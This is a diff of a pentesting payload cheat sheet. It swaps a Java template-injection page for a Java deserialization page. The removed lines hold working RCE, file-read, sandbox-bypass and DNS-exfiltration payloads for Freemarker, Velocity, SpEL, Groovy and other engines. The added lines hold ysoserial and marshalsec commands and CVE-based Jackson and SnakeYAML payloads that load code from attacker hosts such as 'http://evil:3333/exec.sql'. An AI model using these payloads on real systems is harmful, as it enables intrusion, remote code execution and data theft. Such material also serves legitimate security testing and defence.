@@ -1,525 +1,315 @@
-# Server Side Template Injection - Java
+# Java Deserialization
 
-> Server-Side Template Injection (SSTI)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker.
+> Java serialization is the process of converting a Java object’s state into a byte stream, which can be stored or transmitted and later reconstructed (deserialized) back into the original object. Serialization in Java is primarily done using the `Serializable` interface, which marks a class as serializable, allowing it to be saved to files, sent over a network, or transferred between JVMs.
 
 ## Summary
 
-- [Templating Libraries](#templating-libraries)
-- [Java EL](#java-el)
-    - [Java EL - Basic Injection](#java-el---basic-injection)
-    - [Java EL - Code Execution](#java-el---code-execution)
-- [Freemarker](#freemarker)
-    - [Freemarker - Basic Injection](#freemarker---basic-injection)
-    - [Freemarker - Read File](#freemarker---read-file)
-    - [Freemarker - Code Execution](#freemarker---code-execution)
-    - [Freemarker - Code Execution with Obfuscation](#freemarker---code-execution-with-obfuscation)
-    - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)
-- [Jinjava](#jinjava)
-    - [Jinjava - Basic Injection](#jinjava---basic-injection)
-    - [Jinjava - Command Execution](#jinjava---command-execution)
-- [Pebble](#pebble)
-    - [Pebble - Basic Injection](#pebble---basic-injection)
-    - [Pebble - Code Execution](#pebble---code-execution)
-- [Velocity](#velocity)
-- [Groovy](#groovy)
-    - [Groovy - Basic Injection](#groovy---basic-injection)
-    - [Groovy - Read File](#groovy---read-file)
-    - [Groovy - HTTP Request:](#groovy---http-request)
-    - [Groovy - Command Execution](#groovy---command-execution)
-    - [Groovy - Command Execution with Obfuscation](#groovy---command-execution-with-obfuscation)
-    - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
-- [Spring Expression Language](#spring-expression-language)
-    - [SpEL - Basic Injection](#spel---basic-injection)
-    - [SpEL - Retrieve Environment Variables](#spel---retrieve-environment-variables)
-    - [SpEL - Retrieve /etc/passwd](#spel---retrieve-etcpasswd)
-    - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)
-    - [SpEL - Session Attributes](#spel---session-attributes)
-    - [SpEL - Command Execution](#spel---command-execution)
-- [Object-Graph Navigation Language](#object-graph-navigation-language)
-    - [OGNL - Basic Injection](#ognl---basic-injection)
-    - [OGNL - Command Execution](#ognl---command-execution)
-- [References](#references)
+* [Detection](#detection)
+* [Tools](#tools)
+    * [Ysoserial](#ysoserial)
+    * [Burp extensions using ysoserial](#burp-extensions)
+    * [Alternative Tooling](#alternative-tooling)
+* [YAML Deserialization](#yaml-deserialization)
+* [ViewState](#viewstate)
+* [References](#references)
 
-## Templating Libraries
+## Detection
 
-| Template Name | Payload Format         |
-|---------------|------------------------|
-| Codepen       | `#{ }`                 |
-| Freemarker    | `${ }`, `#{ }`, `[= ]` |
-| Groovy        | `${ }`                 |
-| Jinjava       | `{{ }}`                |
-| Pebble        | `{{ }}`                |
-| SpEL          | `*{ }`, `#{ }`, `${ }` |
-| Thymeleaf     | `[[ ]]`                |
-| Velocity      | `#set($X="") $X`       |
+* `"AC ED 00 05"` in Hex
+    * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.
+    * `00 05`: STREAM_VERSION. The serialization version.
+* `"rO0"` in Base64
+* `Content-Type` = "application/x-java-serialized-object"
+* `"H4sIAAAAAAAAAJ"` in gzip(base64)
 
-## Java EL
+## Tools
 
-### Java EL - Basic Injection
+### Ysoserial
 
-Java has multiple Expression Languages using similar syntax.
-
-> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.
+[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 
 ```java
-${7*7}
-${{7*7}}
-${class.getClassLoader()}
-${class.getResource("").getPath()}
-${class.getResource("../../../../../index.htm").getContent()}
+java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
+java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
+java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
+java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
 ```
 
-### Java EL - Code Execution
+**List of payloads included in ysoserial:**
+
+| Payload             | Authors                                | Dependencies                                                                                                                                                                                         |
+| ------------------- | -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                       |
+| BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5                                                                                                                                                                                            |
+| C3P0                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                            |
+| Click1              | @artsploit                             | click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                          |
+| Clojure             | @JackOfMostTrades                      | clojure:1.8.0                                                                                                                                                                                        |
+| CommonsBeanutils1   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                                |
+| CommonsCollections1 | @frohoff                               | commons-collections:3.1                                                                                                                                                                              |
+| CommonsCollections2 | @frohoff                               | commons-collections4:4.0                                                                                                                                                                             |
+| CommonsCollections3 | @frohoff                               | commons-collections:3.1                                                                                                                                                                              |
+| CommonsCollections4 | @frohoff                               | commons-collections4:4.0                                                                                                                                                                             |
+| CommonsCollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1                                                                                                                                                                              |
+| CommonsCollections6 | @matthias_kaiser                       | commons-collections:3.1                                                                                                                                                                              |
+| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1                                                                                                                                                                              |
+| FileUpload1         | @mbechler                              | commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                             |
+| Groovy1             | @frohoff                               | groovy:2.3.9                                                                                                                                                                                         |
+| Hibernate1          | @mbechler                              |                                                                                                                                                                                                      |
+| Hibernate2          | @mbechler                              |                                                                                                                                                                                                      |
+| JBossInterceptors1  | @matthias_kaiser                       | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                             |
+| JRMPClient          | @mbechler                              |                                                                                                                                                                                                      |
+| JRMPListener        | @mbechler                              |                                                                                                                                                                                                      |
+| JSON1               | @mbechler                              | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
+| JavassistWeld1      | @matthias_kaiser                       | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                         |
+| Jdk7u21             | @frohoff                               |                                                                                                                                                                                                      |
+| Jython1             | @pwntester, @cschneider4711            | jython-standalone:2.5.2                                                                                                                                                                              |
+| MozillaRhino1       | @matthias_kaiser                       | js:1.7R2                                                                                                                                                                                             |
+| MozillaRhino2       | @_tint0                                | js:1.7R2                                                                                                                                                                                             |
+| Myfaces1            | @mbechler                              |                                                                                                                                                                                                      |
+| Myfaces2            | @mbechler                              |                                                                                                                                                                                                      |
+| ROME                | @mbechler                              | rome:1.0                                                                                                                                                                                             |
+| Spring1             | @frohoff                               | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                                |
+| Spring2             | @mbechler                              | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                            |
+| URLDNS              | @gebl                                  |                                                                                                                                                                                                      |
+| Vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                           |
+| Wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                                  |
+
+### Burp extensions
+
+* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) -  Burp extension to perform Java Deserialization Attacks
+* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) -  All-in-one plugin for Burp Suite for the detection and the exploitation of Java deserialization vulnerabilities
+* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) -  YSOSERIAL Integration with Burp Suite
+* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java Deserialization Vulnerability Identification
+* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java Deserialization Vulnerability Active Identification Burp Extender
+
+### Alternative Tooling
+
+* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - Pure JRE 8 RCE Deserialization gadget
+* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
+* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - A fork of the original ysoserial application
+* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool
+* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form
+* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - Exploiting Deserialization to Brute-Force the Remote Classpath
+* [k3idii/Deserek](https://github.com/k3idii/Deserek) - Python code to Serialize and Unserialize java binary serialization format.
+
+  ```java
+  java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
+  python deserek.py yss_base.bin --format python > yss_url.py
+  python yss_url.py yss_new.bin
+  java -cp JavaSerializationTestSuite DeSerial yss_new.bin
+  ```
+
+* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Turning your data into code execution
+
+  ```java
+  $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
+  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
+  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
+  // -a - generates/tests all payloads for that marshaller
+  // -t - runs in test mode, unmarshalling the generated payloads after generating them.
+  // -v - verbose mode, e.g. also shows the generated payload in test mode.
+  // gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
+  // arguments - Gadget specific arguments
+  ```
+
+Payload generators for the following marshallers are included:
+
+| Marshaller                  | Gadget Impact                                                                |
+| --------------------------- | ---------------------------------------------------------------------------- |
+| BlazeDSAMF(0&#124;3&#124;X) | JDK only escalation to Java serialization various third party libraries RCEs |
+| Hessian&#124;Burlap         | various third party RCEs                                                     |
+| Castor                      | dependency library RCE                                                       |
+| Jackson                     | **possible JDK only RCE**, various third party RCEs                          |
+| Java                        | yet another third party RCE                                                  |
+| JsonIO                      | **JDK only RCE**                                                             |
+| JYAML                       | **JDK only RCE**                                                             |
+| Kryo                        | third party RCEs                                                             |
+| KryoAltStrategy             | **JDK only RCE**                                                             |
+| Red5AMF(0&#124;3)           | **JDK only RCE**                                                             |
+| SnakeYAML                   | **JDK only RCEs**                                                            |
+| XStream                     | **JDK only RCEs**                                                            |
+| YAMLBeans                   | third party RCE                                                              |
+
+## JSON Deserialization
+
+Multiple libraries can be used to handle JSON in Java.
+
+* [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)
+* [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
+* [Fastjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#fastjson-json)
+* [Genson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)
+* [Flexjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#flexjson-json)
+* [Jodd](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jodd-json)
+
+**Jackson**:
+
+Jackson is a popular Java library used for working with JSON (JavaScript Object Notation) data.
+Jackson-databind supports Polymorphic Type Handling (PTH), formerly known as "Polymorphic Deserialization", which is disabled by default.
+
+To determine if the backend is using Jackson, the most common technique is to send an invalid JSON and inspect the error message. Look for references to either of those:
 
 ```java
-${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE
-${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE
-${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE
-${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE
-
+Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
 ```
 
----
-
-## Freemarker
-
-[Official website](https://freemarker.apache.org/)
-> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.
-
-You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)
-
-### Freemarker - Basic Injection
-
-The template can be :
-
-- Default: `${3*3}`  
-- Legacy: `#{3*3}`
-- Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)
-
-### Freemarker - Read File
-
-```js
-${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
-Convert the returned bytes to ASCII
-```
-
-### Freemarker - Code Execution
-
-```js
-<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
-[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
-${"freemarker.template.utility.Execute"?new()("id")}
-#{"freemarker.template.utility.Execute"?new()("id")}
-[="freemarker.template.utility.Execute"?new()("id")]
-
-${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()} // Error-Based RCE
-${1/((freemarker.template.utility.Execute"?new()(" … && echo UniqueString")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)} // Boolean-Based RCE
-${"freemarker.template.utility.Execute"?new()("id && sleep 5")} // Time-Based RCE
-```
-
-### Freemarker - Code Execution with Obfuscation
-
-FreeMarker offers the built-in function: `lower_abc`. This function converts int-based values into alphabetic strings, but not in the way you might expect from functions such as `chr` in Python, as the [documentation for lower_abc explains](https://freemarker.apache.org/docs/ref_builtins_number.html#ref_builtin_lower_abc):
-
-If you wanted a string that represents the string: "id", you could use the payload: `${9?lower_abc+4?lower_abc)}`.
-
-Chaining `lower_abc` to perform code execution (command: `id`):
-
-```js
-${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
-```
-
-Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
-
-### Freemarker - Sandbox Bypass
-
-:warning: only works on Freemarker versions below 2.3.30
-
-```js
-<#assign classloader=article.class.protectionDomain.classLoader>
-<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
-<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
-<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
-${dwf.newInstance(ec,null)("id")}
-```
-
----
-
-## Jinjava
-
-[Official website](https://github.com/HubSpot/jinjava)
-> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).
-
-### Jinjava - Basic Injection
-
-```python
-{{'a'.toUpperCase()}} would result in 'A'
-{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
-```
-
-Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
-
-### Jinjava - Command Execution
-
-Fixed by [HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)
-
-```ps1
-{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
-
-{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
-
-{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
-
-{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
-```
-
----
-
-## Pebble
-
-[Official website](https://pebbletemplates.io/)
-
-> Pebble is a Java templating engine inspired by [Twig](./PHP.md#twig) and similar to the Python [Jinja](./Python.md#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.
-
-### Pebble - Basic Injection
-
-```java
-{{ someString.toUPPERCASE() }}
-```
-
-### Pebble - Code Execution
-
-Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.
-
-New version of Pebble :
-
-```java
-{% set cmd = 'id' %}
-{% set bytes = (1).TYPE
-     .forName('java.lang.Runtime')
-     .methods[6]
-     .invoke(null,null)
-     .exec(cmd)
-     .inputStream
-     .readAllBytes() %}
-{{ (1).TYPE
-     .forName('java.lang.String')
-     .constructors[0]
-     .newInstance(([bytes]).toArray()) }}
-```
-
----
-
-## Velocity
-
-[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
-
-> Apache Velocity is a Java-based template engine that allows web designers to embed Java code references directly within templates.
-
-In a vulnerable environment, Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes the whoami command and prints the result:
-
-```java
-#set($str=$class.inspect("java.lang.String").type)
-#set($chr=$class.inspect("java.lang.Character").type)
-#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])
-$str.valueOf($chr.toChars($out.read()))
-#end
-```
-
-A more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo "a" > /tmp/a`. Below is an example with `whoami` in base64:
-
-```java
-#set($base64EncodedCommand = 'd2hvYW1p')
-
-#set($contextObjectClass = $knownContextObject.getClass())
-
-#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
-#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
-#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))
-
-#set($StringClass = $contextObjectClass.forName("java.lang.String"))
-#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))
-
-#set($commandArgs = ["/bin/sh", "-c", $command])
-
-#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
-#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
-#set($processBuilder = $processBuilder.redirectErrorStream(true))
-#set($process = $processBuilder.start())
-#set($exitCode = $process.waitFor())
-
-#set($inputStream = $process.getInputStream())
-#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
-#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
-#set($scannerDelimiter = $scanner.useDelimiter("\\A"))
-
-#if($scanner.hasNext())
-  #set($output = $scanner.next().trim())
-  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
-#end
-```
-
-Error-Based RCE payload:
-
-```java
-#set($s="")
-#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))
-#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
-#set($n=$p.waitFor())
-#set($b="Y:/A:/"+$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))
-#include($b)
-```
-
-Boolean-Based RCE payload:
-
-```java
-#set($s="")
-#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
-#set($n=$p.waitFor())
-#set($r=$p.exitValue())
-#if($r != 0)
-#include("Y:/A:/xxx")
-#end
-```
-
-Time-Based RCE payload:
-
-```java
-#set($s="")
-#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
-#set($n=$p.waitFor())
-#set($r=$p.exitValue())
-#if($r != 0)
-#set($t=$s.getClass().forName("java.lang.Thread").sleep(5000))
-#end
-```
-
----
-
-## Groovy
-
-[Official website](https://groovy-lang.org/)
-
-### Groovy - Basic injection
-
-Refer to [groovy-lang.org/syntax](https://groovy-lang.org/syntax.html) , but `${9*9}` is the basic injection.
-
-### Groovy - Read File
-
-```groovy
-${String x = new File('c:/windows/notepad.exe').text}
-${String x = new File('/path/to/file').getText('UTF-8')}
-${new File("C:\Temp\FileName.txt").createNewFile();}
-```
-
-### Groovy - HTTP Request
-
-```groovy
-${"http://www.google.com".toURL().text}
-${new URL("http://www.google.com").getText()}
-```
-
-### Groovy - Command Execution
-
-```groovy
-${"calc.exe".exec()}
-${"calc.exe".execute()}
-${this.evaluate("9*9") //(this is a Script class)}
-${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
-```
-
-### Groovy - Command Execution with Obfuscation
-
-You can bypass security filters by constructing strings from ASCII codes and executing them as system commands.
-
-Payload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`.
-
-Execute system command (command: `id`):
-
-```groovy
-${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
-```
-
-Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
-
-### Groovy - Sandbox Bypass
-
-```groovy
-${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
-def x }
-```
-
-or
-
-```groovy
-${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
-```
-
----
-
-## Spring Expression Language
-
-> Java EL payloads also work for SpEL
-
-[Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)
-
-> The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably method invocation and basic string templating functionality.
-
-### SpEL - Basic Injection
-
-> SpEL has built-in templating system using `#{ }`, but SpEL is also commonly used for interpolation using `${ }`.
-
-```java
-${7*7}
-${'patt'.toString().replace('a', 'x')}
-${T(java.lang.Integer).valueOf('1')}
-```
-
-### SpEL - Retrieve Environment Variables
-
-```java
-${T(java.lang.System).getenv()}
-```
-
-### SpEL - Retrieve /etc/passwd
-
-```java
-${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
-
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
-```
-
-### SpEL - DNS Exfiltration
-
-DNS lookup
-
-```java
-${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","[ATTACKER.DOMAIN.TLD]")}
-```
-
-### SpEL - Session Attributes
-
-Modify session attributes
-
-```java
-${pageContext.request.getSession().setAttribute("admin",true)}
-```
-
-### SpEL - Command Execution
-
-- Method using `java.lang.Runtime` #1 - accessed with JavaClass
-
-    ```java
-    ${T(java.lang.Runtime).getRuntime().exec("whoami")}
+* com.fasterxml.jackson.databind
+* org.codehaus.jackson.map
+
+**Exploitation**:
+
+* **CVE-2017-7525**
+
+  ```json
+  {
+    "param": [
+      "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+      {
+        "transletBytecodes": [
+          "yv66v[JAVA_CLASS_B64_ENCODED]AIAEw=="
+        ],
+        "transletName": "a.b",
+        "outputProperties": {}
+      }
+    ]
+  }
     ```
 
-- Method using `java.lang.Runtime` #2
+* **CVE-2017-17485**
 
-    ```java
-    #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
-    #{session.getAttribute("rtc").setAccessible(true)}
-    #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
+  ```json
+  {
+    "param": [
+      "org.springframework.context.support.FileSystemXmlApplicationContext",
+      "http://evil/spel.xml"
+    ]
+  }
+  ```
+
+* **CVE-2019-12384**
+
+  ```json
+  [
+    "ch.qos.logback.core.db.DriverManagerConnectionSource", 
+    {
+      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"
+    }
+  ]
+  ```
+
+* **CVE-2020-36180**
+
+  ```json
+  [
+    "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
+    {
+      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'"
+    }
+  ]
+  ```
+
+* **CVE-2020-9548**
+
+    ```json
+    [
+      "br.com.anteros.dbcp.AnterosDBCPConfig",
+      {
+        "healthCheckRegistry": "ldap://{{interactsh-url}}"
+      }
+    ]
     ```
 
-- Method using `java.lang.Runtime` #3 - accessed with `invoke`
+## YAML Deserialization
 
-    ```java
-    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}
-    ```
+* [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)
+* [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)
+* [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)
 
-- Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`
+**SnakeYAML**:
 
-    ```java
-    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"whoami\\\")"))}
-    ```
+SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YAML Ain't Markup Language) data. It provides an easy-to-use API for working with YAML, a human-readable data serialization standard commonly used for configuration files and data exchange.
 
-- Method using `java.lang.ProcessBuilder`
-
-    ```java
-    ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
-    ${request.getAttribute("c").add("cmd.exe")}
-    ${request.getAttribute("c").add("/k")}
-    ${request.getAttribute("c").add("whoami")}
-    ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
-    ${request.getAttribute("a")}
-    ```
-  
-- Error-Based payload:
-  
-    ```java
-    ${T(java.lang.Integer).valueOf("x"+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec("id").inputStream.readAllBytes()))}
-    ```
-  
-- Boolean-Based payload:
-  
-    ```java
-    ${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}
-    ```
-  
-- Time-Based payload:
-  
-    ```java
-    ${(T(java.lang.Runtime).getRuntime().exec("id").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}
-    ```
-
-## Object-Graph Navigation Language
-
-[Official website](https://commons.apache.org/dormant/commons-ognl/)
-
-> OGNL stands for Object-Graph Navigation Language; it is an expression language for getting and setting properties of Java objects, plus other extras such as list projection and selection and lambda expressions. You use the same expression for both getting and setting the value of a property.
-
-### OGNL - Basic Injection
-
-> OGNL can be used with different tags like `${ }`
-
-```java
-7*7
-'patt'.toString().replace('a', 'x')
-@java.lang.Integer@valueOf('1')
+```yaml
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://attacker-ip/"]
+  ]]
+]
 ```
 
